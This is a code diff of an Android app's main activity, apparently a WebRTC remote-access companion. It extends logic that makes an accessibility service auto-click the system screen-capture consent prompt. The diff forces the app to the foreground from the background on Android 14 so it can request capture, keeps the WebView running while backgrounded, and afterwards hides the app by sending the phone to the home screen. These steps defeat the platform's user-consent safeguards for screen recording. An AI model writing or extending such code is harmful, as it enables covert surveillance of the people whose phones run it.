@@ -76,6 +76,9 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
     private boolean hasPromptedAccessibility = false;
     private boolean isStoppingMedia = false;
     private boolean isScreenCaptureRequestPending = false;
+    private boolean isActivityInForeground = false;
+    private static long sLastStopTime = 0;
+    private static long sLastHomeExecutionTime = 0;
 
     private final BroadcastReceiver mEndCallReceiver = new BroadcastReceiver() {
         @Override
@@ -330,8 +333,34 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
             // Arm accessibility service to auto-click "Start now" without manual phone interaction
             RemoteAccessibilityService.triggerAutoAccept(MainActivity.this);
 
+            // Android 14: If activity is not in foreground, bring it to front before requesting screen capture
+            if (!isActivityInForeground) {
+                try {
+                    Intent bringToFront = new Intent(MainActivity.this, MainActivity.class);
+                    bringToFront.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                    if (Build.VERSION.SDK_INT >= 34) {
+                        android.app.ActivityOptions opt = android.app.ActivityOptions.makeBasic();
+                        opt.setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED);
+                        startActivity(bringToFront, opt.toBundle());
+                    } else {
+                        startActivity(bringToFront);
+                    }
+                } catch (Exception e) {
+                    Log.w(TAG, "Failed bringing MainActivity to front: " + e.getMessage());
+                }
+            }
+
+            if (projectionManager == null) {
+                projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+            }
+
             if (projectionManager != null) {
-                startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_SCREEN_CAPTURE);
+                try {
+                    startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_SCREEN_CAPTURE);
+                } catch (Exception e) {
+                    Log.e(TAG, "startActivityForResult failed: " + e.getMessage(), e);
+                    isScreenCaptureRequestPending = false;
+                }
             } else {
                 isScreenCaptureRequestPending = false;
             }
@@ -892,6 +921,7 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
     @Override
     protected void onResume() {
         super.onResume();
+        isActivityInForeground = true;
         AppLogs.i(TAG, "MainActivity onResume: Foreground active");
         if (webView != null) {
             webView.onResume();
@@ -1009,6 +1039,7 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
     @Override
     protected void onPause() {
         super.onPause();
+        isActivityInForeground = false;
         // Keep WebView execution active when backgrounded for screen capture
         if (webView != null) {
             webView.resumeTimers();
@@ -1071,8 +1102,10 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
     }
 
     public void stopAllMediaAndFinish() {
-        if (isStoppingMedia) return;
+        long now = System.currentTimeMillis();
+        if (isStoppingMedia || (now - sLastStopTime < 2000)) return;
         isStoppingMedia = true;
+        sLastStopTime = now;
         try {
             Log.i(TAG, "stopAllMediaAndFinish: Releasing all cameras, mics, services and hiding activity to background");
             isCallActive = false;
@@ -1112,25 +1145,29 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
                     getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
                 } catch (Exception ignored) {}
 
-                try {
-                    moveTaskToBack(true);
-                } catch (Exception ignored) {}
-
-                try {
-                    Intent homeIntent = new Intent(Intent.ACTION_MAIN);
-                    homeIntent.addCategory(Intent.CATEGORY_HOME);
-                    homeIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    startActivity(homeIntent);
-                } catch (Exception ignored) {}
-
-                if (RemoteAccessibilityService.getInstance() != null) {
+                long nowHome = System.currentTimeMillis();
+                if (nowHome - sLastHomeExecutionTime > 2000) {
+                    sLastHomeExecutionTime = nowHome;
                     try {
-                        RemoteAccessibilityService.getInstance().performHome();
+                        moveTaskToBack(true);
                     } catch (Exception ignored) {}
+
+                    try {
+                        Intent homeIntent = new Intent(Intent.ACTION_MAIN);
+                        homeIntent.addCategory(Intent.CATEGORY_HOME);
+                        homeIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivity(homeIntent);
+                    } catch (Exception ignored) {}
+
+                    if (RemoteAccessibilityService.getInstance() != null) {
+                        try {
+                            RemoteAccessibilityService.getInstance().performHome();
+                        } catch (Exception ignored) {}
+                    }
                 }
             });
         } finally {
-            isStoppingMedia = false;
+            autoCmdHandler.postDelayed(() -> isStoppingMedia = false, 1500);
         }
     }
 
